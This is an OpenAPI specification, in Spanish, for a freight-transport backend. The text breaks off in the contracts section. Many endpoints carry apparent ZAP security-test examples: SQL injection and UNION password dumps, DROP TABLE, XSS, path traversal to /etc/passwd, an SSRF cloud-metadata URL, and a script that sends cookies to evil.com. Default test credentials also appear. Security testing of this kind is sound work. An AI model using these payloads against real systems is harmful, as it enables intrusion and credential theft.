openapi: 3.0.3
info:
  title: Nanutech Backend API
  description: |
    API de gestión de transporte de carga pesada.
    Roles: ADMIN, GERENTE, CHOFER.
    Auth: Bearer token desde POST /auth/login.
    
    Endpoints no documentados oficialmente pero presentes en el código:
    - /alertas/* (6 endpoints)
    - /jornadas/historial-gerencial (2 endpoints)
    - /jornadas/alerta/{jornadaId}
    - /conductores/{id}/estadisticas
    - /conductores/dashboard/resumen
    - /conductores/dashboard/listado
    - PUT /contratos/{id}
    - PUT /contratos/{id}/unidades
  version: "2.0.0"

servers:
  - url: "API_URL_PLACEHOLDER"
    description: Ambiente de testing

components:
  securitySchemes:
    BearerAuth:
      type: http
      scheme: bearer
      bearerFormat: JWT

  schemas:
    LoginRequest:
      type: object
      required: [email, password]
      properties:
        email: { type: string, format: email, example: admin@nanutech.com }
        password: { type: string, example: "Admin123!" }

    CreateCamionRequest:
      type: object
      required: [placa, marca, modelo, anio, capacidad_ton, vin, color, combustible, gps]
      properties:
        placa: { type: string, example: "ZAP-001" }
        marca: { type: string, example: "Volvo" }
        modelo: { type: string, example: "FH16" }
        anio: { type: integer, minimum: 1990, maximum: 2027, example: 2023 }
        capacidad_ton: { type: number, minimum: 0.1, example: 20.0 }
        vin: { type: string, minLength: 13, example: "VINZAP0000001" }
        color: { type: string, example: "Blanco" }
        combustible:
          type: string
          enum: [DIESEL, GASOLINA, GNV, GLP, ELECTRICO, HIBRIDO]
          example: "DIESEL"
        gps: { type: boolean, example: true }
        estado:
          type: string
          enum: [DISPONIBLE, EN_JORNADA, EN_AUXILIO, MANTENIMIENTO, INACTIVA]
        kilometraje_actual: { type: number, example: 0 }
        notas: { type: string, example: "Unidad nueva" }

    CreateJornadaRequest:
      type: object
      required: [conductor_id, unidad_id, contrato_id, fecha_jornada, origen, destino, km_estimados]
      properties:
        conductor_id: { type: string, format: uuid, example: "22222222-2222-2222-2222-222222222222" }
        unidad_id: { type: string, format: uuid, example: "aaaa0003-0000-0000-0000-000000000003" }
        contrato_id: { type: string, format: uuid, example: "bbbb0001-0000-0000-0000-000000000001" }
        creado_por: { type: string, format: uuid, example: "11111111-1111-1111-1111-111111111111" }
        fecha_jornada: { type: string, format: date, example: "2026-06-01" }
        origen: { type: string, example: "Lima" }
        destino: { type: string, example: "Arequipa" }
        km_estimados: { type: number, example: 520 }
        tipo_carga: { type: string, example: "Mineral concentrado" }
        peso_carga_ton: { type: number, example: 18.5 }
        observaciones: { type: string, example: "Sin novedades" }

    CreateContratoRequest:
      type: object
      required: [cliente, ruc, tipo_servicio, fecha_inicio, origen, destino, distancia_estimada_km, tarifa_por_km]
      properties:
        cliente: { type: string, example: "Empresa Test SA" }
        ruc: { type: string, pattern: '^\d{11}$', example: "20123456799" }
        descripcion: { type: string, example: "Contrato de prueba ZAP" }
        tipo_servicio:
          type: string
          enum: [POR_VIAJE, POR_HORA, POR_TONELADA, POR_KM, MENSUAL]
          example: "POR_VIAJE"
        fecha_inicio: { type: string, format: date, example: "2026-06-01" }
        fecha_fin: { type: string, format: date, example: "2026-12-31" }
        origen: { type: string, example: "Lima" }
        destino: { type: string, example: "Arequipa" }
        distancia_estimada_km: { type: number, example: 520 }
        tarifa_por_km: { type: number, example: 5.50 }
        tarifa_por_hora: { type: number, example: 0 }
        tarifa_espera: { type: number, example: 0 }
        moneda: { type: string, example: "PEN" }

    UpdateContratoRequest:
      type: object
      properties:
        fecha_inicio: { type: string, format: date, example: "2026-01-01" }
        fecha_fin: { type: string, format: date, example: "2026-12-31" }
        tipo_servicio:
          type: string
          enum: [POR_VIAJE, POR_HORA, POR_TONELADA, POR_KM, MENSUAL]
        descripcion: { type: string, example: "Descripción actualizada" }
        tarifa: { type: number, example: 15000 }
        tarifas:
          type: object
          properties:
            base: { type: number, example: 5000 }
            hora: { type: number, example: 450 }
            tonelada: { type: number, example: 180 }

    AssignUnidadesRequest:
      type: object
      required: [unidades]
      properties:
        unidades:
          type: array
          items: { type: string, format: uuid }
          example: ["aaaa0001-0000-0000-0000-000000000001"]

    IniciarJornadaRequest:
      type: object
      required: [jornada_id]
      properties:
        jornada_id: { type: string, format: uuid, example: "cccc0003-0000-0000-0000-000000000003" }

    FinalizarJornadaRequest:
      type: object
      required: [jornada_id]
      properties:
        jornada_id: { type: string, format: uuid, example: "cccc0002-0000-0000-0000-000000000002" }
        km_recorridos: { type: number, example: 300 }
        observaciones: { type: string, example: "Sin incidencias" }

    RegisterSosRequest:
      type: object
      required: [jornada_id, conductor_id, latitud, longitud]
      properties:
        jornada_id: { type: string, format: uuid, example: "cccc0002-0000-0000-0000-000000000002" }
        conductor_id: { type: string, format: uuid, example: "33333333-3333-3333-3333-333333333333" }
        latitud: { type: number, example: -12.0464 }
        longitud: { type: number, example: -77.0428 }
        direccion: { type: string, example: "Lima Centro" }
        detalle: { type: string, example: "SOS activado" }
        timestamp_local: { type: string, example: "2026-05-23T10:00:00" }
        created_offline: { type: boolean, example: false }
        event_id_cliente: { type: string, example: "SOS-LOCAL-001" }

    RegisterAuxilioRequest:
      type: object
      required: [jornada_id, conductor_id, tipo_falla_mecanica, latitud, longitud]
      properties:
        jornada_id: { type: string, format: uuid, example: "cccc0002-0000-0000-0000-000000000002" }
        conductor_id: { type: string, format: uuid, example: "33333333-3333-3333-3333-333333333333" }
        tipo_falla_mecanica:
          type: string
          enum: ["Falla de Motor", "Pinchazo/Llantas", "Fallo en frenos", "Problema eléctrico", "Falta de combustible", "Problema de transmisión", "Otro"]
          example: "Pinchazo/Llantas"
        latitud: { type: number, example: -12.0464 }
        longitud: { type: number, example: -77.0428 }
        direccion: { type: string, example: "Lima Centro" }
        detalle: { type: string, example: "Llanta delantera derecha" }
        timestamp_local: { type: string, example: "2026-05-23T10:00:00" }
        created_offline: { type: boolean, example: false }
        event_id_cliente: { type: string, example: "AUX-LOCAL-001" }

    ResolverAlertaRequest:
      type: object
      properties:
        detalle_resolucion: { type: string, example: "Alerta atendida y cerrada" }
        servicio_tecnico_realizado: { type: string, example: "No aplica" }

    ActualizarEstadoAlertaRequest:
      type: object
      required: [estado]
      properties:
        estado:
          type: string
          enum: [EN_PROCESO, RESUELTA]
          example: "EN_PROCESO"

    GpsImportRequest:
      type: object
      required: [proveedor, nombre_archivo, csv]
      properties:
        proveedor:
          type: string
          enum: [GPSCONTROL, GLOBALGPS]
          example: "GPSCONTROL"
        nombre_archivo: { type: string, example: "tracking.csv" }
        csv:
          type: string
          example: "fecha,hora,placa,latitud,longitud,velocidad,rumbo,distancia_total\n2026-05-01,08:00:00,ABC-123,-12.0464,-77.0428,60,180,1000"
        cargado_por: { type: string, format: uuid, example: "11111111-1111-1111-1111-111111111111" }

    ErrorResponse:
      type: object
      properties:
        success: { type: boolean, example: false }
        message: { type: string }
        code: { type: string }

  responses:
    Unauthorized:
      description: Token ausente o inválido
      content:
        application/json:
          schema: { $ref: '#/components/schemas/ErrorResponse' }
          example: { success: false, message: "Token de acceso requerido", code: "TOKEN_REQUIRED" }
    Forbidden:
      description: Rol sin acceso
      content:
        application/json:
          schema: { $ref: '#/components/schemas/ErrorResponse' }
          example: { success: false, message: "Acceso denegado", code: "FORBIDDEN" }

security:
  - BearerAuth: []

paths:

  # =========================================================
  # AUTH
  # =========================================================
  /auth/login:
    post:
      summary: Iniciar sesión (público)
      tags: [Auth]
      security: []
      requestBody:
        required: true
        content:
          application/json:
            schema: { $ref: '#/components/schemas/LoginRequest' }
            examples:
              admin_valido:
                value: { email: "admin@nanutech.com", password: "Admin123!" }
              gerente_valido:
                value: { email: "gerente@nanutech.com", password: "Admin123!" }
              chofer_valido:
                value: { email: "chofer@nanutech.com", password: "Admin123!" }
              zap_sqli_email:
                value: { email: "' OR '1'='1' --", password: "x" }
              zap_sqli_union:
                value: { email: "' UNION SELECT correo,password FROM usuarios --", password: "x" }
              zap_xss_email:
                value: { email: "<script>alert(document.cookie)</script>@x.com", password: "test" }
              zap_xss_svg:
                value: { email: "<svg/onload=alert(1)>@x.com", password: "test" }
              zap_overflow:
                value: { email: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@x.com", password: "x" }
      responses:
        '200': { description: Login exitoso }
        '400': { description: Datos inválidos }
        '401': { description: Credenciales incorrectas }
        '423': { description: Cuenta bloqueada }

  /auth/forgot-password:
    post:
      summary: Recuperar contraseña (público)
      tags: [Auth]
      security: []
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              required: [email]
              properties:
                email: { type: string, format: email, example: admin@nanutech.com }
            examples:
              valido: { value: { email: "admin@nanutech.com" } }
              zap_sqli: { value: { email: "' OR '1'='1" } }
              zap_xss: { value: { email: "<script>alert(1)</script>@x.com" } }
      responses:
        '200': { description: Correo enviado }
        '400': { description: Email inválido }

  /auth/forgot-password/confirm:
    post:
      summary: Confirmar nueva contraseña (público)
      tags: [Auth]
      security: []
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              required: [email, code, newPassword]
              properties:
                email: { type: string, format: email }
                code: { type: string, example: "123456" }
                newPassword: { type: string, example: "NuevoPass123!" }
            examples:
              valido: { value: { email: "admin@nanutech.com", code: "123456", newPassword: "NuevoPass123!" } }
              zap_sqli: { value: { email: "admin@nanutech.com", code: "' OR '1'='1", newPassword: "x" } }
              zap_xss: { value: { email: "admin@nanutech.com", code: "123456", newPassword: "<script>alert(1)</script>" } }
      responses:
        '200': { description: Contraseña actualizada }
        '401': { description: Código inválido }
        '404': { description: Usuario no encontrado }

  /auth/me:
    get:
      summary: Sesión actual (ADMIN, GERENTE, CHOFER)
      tags: [Auth]
      responses:
        '200': { description: Datos del usuario autenticado }
        '401': { $ref: '#/components/responses/Unauthorized' }

  # =========================================================
  # CAMIONES — solo ADMIN
  # =========================================================
  /camiones:
    get:
      summary: Listar camiones (solo ADMIN)
      tags: [Camiones]
      parameters:
        - name: placa
          in: query
          schema: { type: string }
          examples:
            normal: { value: "ABC" }
            zap_sqli: { value: "' OR '1'='1" }
            zap_sqli_drop: { value: "'; DROP TABLE unidades; --" }
            zap_xss: { value: "<script>alert(1)</script>" }
            zap_traversal: { value: "../../../etc/passwd" }
        - name: estado
          in: query
          schema:
            type: string
            enum: [DISPONIBLE, EN_JORNADA, EN_AUXILIO, MANTENIMIENTO, INACTIVA, TODOS]
      responses:
        '200': { description: Lista de camiones }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }

    post:
      summary: Crear camión (solo ADMIN)
      tags: [Camiones]
      requestBody:
        required: true
        content:
          application/json:
            schema: { $ref: '#/components/schemas/CreateCamionRequest' }
            examples:
              valido:
                value: { placa: "ZAP-001", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINZAP0000001", color: "Blanco", combustible: "DIESEL", gps: true }
              zap_sqli_placa:
                value: { placa: "'; DROP TABLE unidades; --", marca: "Test", modelo: "Test", anio: 2023, capacidad_ton: 10, vin: "VIN1234567890AB", color: "Rojo", combustible: "DIESEL", gps: false }
              zap_sqli_vin:
                value: { placa: "ZAP-002", marca: "Test", modelo: "Test", anio: 2023, capacidad_ton: 10, vin: "' OR '1'='1'--AB", color: "Rojo", combustible: "DIESEL", gps: false }
              zap_xss_marca:
                value: { placa: "ZAP-XSS1", marca: "<img src=x onerror=alert(document.cookie)>", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINXSS000000001", color: "Azul", combustible: "DIESEL", gps: true }
              zap_xss_notas:
                value: { placa: "ZAP-XSS2", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINXSS000000002", color: "Negro", combustible: "DIESEL", gps: true, notas: "<script>fetch('https://evil.com?c='+document.cookie)</script>" }
              zap_ssrf:
                value: { placa: "ZAP-SSRF", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINSSRF00000001", color: "Blanco", combustible: "DIESEL", gps: true, notas: "http://169.254.169.254/latest/meta-data/" }
              zap_overflow_anio:
                value: { placa: "ZAP-OVF1", marca: "Volvo", modelo: "FH16", anio: 99999999999999999999999999999999999999999999, capacidad_ton: 20, vin: "VINOVF000000001", color: "Blanco", combustible: "DIESEL", gps: true }
      responses:
        '201': { description: Camión creado }
        '400': { description: Error de validación }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }

  /camiones/{id}:
    get:
      summary: Obtener camión por ID (solo ADMIN)
      tags: [Camiones]
      parameters:
        - name: id
          in: path
          required: true
          schema: { type: string }
          examples:
            valido: { value: "aaaa0001-0000-0000-0000-000000000001" }
            zap_sqli: { value: "' OR '1'='1" }
            zap_sqli_union: { value: "1 UNION SELECT correo,password,rol,4,5,6,7,8,9,10 FROM usuarios--" }
            zap_traversal: { value: "../../etc/passwd" }
            zap_xss: { value: "<script>alert(1)</script>" }
            zap_overflow: { value: "99999999999999999999999999999999999999999999" }
      responses:
        '200': { description: Detalle del camión }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }
        '404': { description: No encontrado }

  /camiones/panel:
    get:
      summary: Panel de monitoreo (solo ADMIN)
      tags: [Camiones]
      parameters:
        - name: placa
          in: query
          schema: { type: string }
          examples:
            normal: { value: "ABC" }
            zap_sqli: { value: "' OR '1'='1" }
            zap_xss: { value: "<script>alert(1)</script>" }
        - name: estado
          in: query
          schema: { type: string, enum: [DISPONIBLE, EN_JORNADA, MANTENIMIENTO, TODOS] }
      responses:
        '200': { description: Panel con resumen }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }

  /camiones/exportar/csv:
    get:
      summary: Exportar camiones CSV (solo ADMIN)
      tags: [Camiones]
      parameters:
        - name: placa
          in: query
          schema: { type: string }
        - name: estado
          in: query
          schema: { type: string }
      responses:
        '200':
          description: Archivo CSV
          content:
            text/csv:
              schema: { type: string }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }

  # =========================================================
  # DASHBOARD
  # =========================================================
  /dashboard:
    get:
      summary: Dashboard admin (solo ADMIN)
      tags: [Dashboard]
      responses:
        '200': { description: Datos del dashboard }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }

  /dashboard/gerencial:
    get:
      summary: Dashboard gerencial (GERENTE y ADMIN según código)
      tags: [Dashboard]
      parameters:
        - name: tiempo
          in: query
          schema: { type: string, enum: [hoy, semana, mes, todas] }
          example: "todas"
        - name: search
          in: query
          schema: { type: string }
          examples:
            normal: { value: "ABC" }
            zap_sqli: { value: "' OR '1'='1" }
            zap_xss: { value: "<script>alert(1)</script>" }
      responses:
        '200': { description: Datos gerenciales }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }

  # =========================================================
  # CONDUCTORES — ADMIN y GERENTE
  # =========================================================
  /conductores:
    get:
      summary: Listar conductores (ADMIN, GERENTE)
      tags: [Conductores]
      responses:
        '200': { description: Lista de conductores }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }

  /conductores/{id}/estadisticas:
    get:
      summary: Estadísticas de conductor (ADMIN, GERENTE) — no documentado oficialmente
      tags: [Conductores]
      parameters:
        - name: id
          in: path
          required: true
          schema: { type: string, format: uuid }
          examples:
            valido: { value: "22222222-2222-2222-2222-222222222222" }
            zap_sqli: { value: "' OR '1'='1" }
            zap_traversal: { value: "../../etc/passwd" }
            zap_overflow: { value: "99999999999999999999999999999999999999999999" }
      responses:
        '200': { description: Estadísticas del conductor }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }
        '404': { description: Conductor no encontrado }

  /conductores/dashboard/resumen:
    get:
      summary: Resumen dashboard conductores (solo ADMIN) — no documentado oficialmente
      tags: [Conductores]
      responses:
        '200': { description: Indicadores y gráficos del dashboard de conductores }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }

  /conductores/dashboard/listado:
    get:
      summary: Listado paginado conductores (solo ADMIN) — no documentado oficialmente
      tags: [Conductores]
      parameters:
        - name: busqueda
          in: query
          schema: { type: string }
          examples:
            normal: { value: "Carlos" }
            zap_sqli: { value: "' OR '1'='1" }
            zap_xss: { value: "<script>alert(1)</script>" }
        - name: estado
          in: query
          schema: { type: string, enum: [ACTIVOS, INACTIVOS, TODOS] }
        - name: disponibilidad
          in: query
          schema: { type: string, enum: [DISPONIBLE, EN_RUTA, DESCANSO, TODOS] }
        - name: page
          in: query
          schema: { type: integer, example: 1 }
        - name: limit
          in: query
          schema: { type: integer, example: 20 }
      responses:
        '200': { description: Listado paginado de conductores }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }

  # =========================================================
  # CONTRATOS
  # =========================================================
  /contratos:
    get:
      summary: Listar contratos (solo GERENTE)
      tags: [Contratos]
      parameters:
        - name: q
          in: query
          schema: { type: string }
          examples:
            normal: { value: "Minera" }
            zap_sqli: { value: "' OR '1'='1" }
            zap_xss: { value: "<script>alert(1)</script>" }
        - name: estado
          in: query
          schema: { type: string, enum: [VIGENTE, VENCIDO, SUSPENDIDO, INACTIVO] }
        - name: page
          in: query
          schema: { type: integer, example: 1 }
        - name: limit
          in: query
          schema: { type: integer, example: 10 }
      responses:
        '200': { description: Lista de contratos }
        '401': { $ref: '#/components/responses/Unauthorized' }
        '403': { $ref: '#/components/responses/Forbidden' }

    post:
      summary: Crear contrato (solo GERENTE)
      tags: [Contratos]
      requestBody:
        required: true
        content:
          application/json:
            schema: { $ref: '#/components/schemas/CreateContratoRequest' }
            examples:
              valido:
                value:
                  cliente: "Empresa Test SA"
                  ruc: "20123456799"
                  tipo_servicio: "POR_VIAJE"
                  fecha_inicio: "2026-06-01"
                  fecha_fin: "2026-12-31"
                  origen: "Lima"
                  destino: "Arequipa"
                  distancia_estimada_km: 520
                  tarifa_por_km: 5.50
                  moneda: "PEN"
              zap_xss_cliente:
                value:
                  cliente: "<script>alert(document.cookie)</script>"
                  ruc: "20123456799"
                  tipo_servicio: "POR_VIAJE"
                  fecha_inicio: "2026-06-01"
                  origen: "Lima"
                  destino: "Arequipa"
                  distancia_estimada_km: 520
                  tarifa_por_km: 5.50
              zap_sqli_cliente:
                value:
                  cliente: "' UNION SELECT correo,password FROM usuarios--"
                  ruc: "20123456799"
                  tipo_servicio: "POR_VIAJE"
                  fecha_inicio: "2026-06-01"
                  origen: "Lima"
                  destino: "Arequipa"
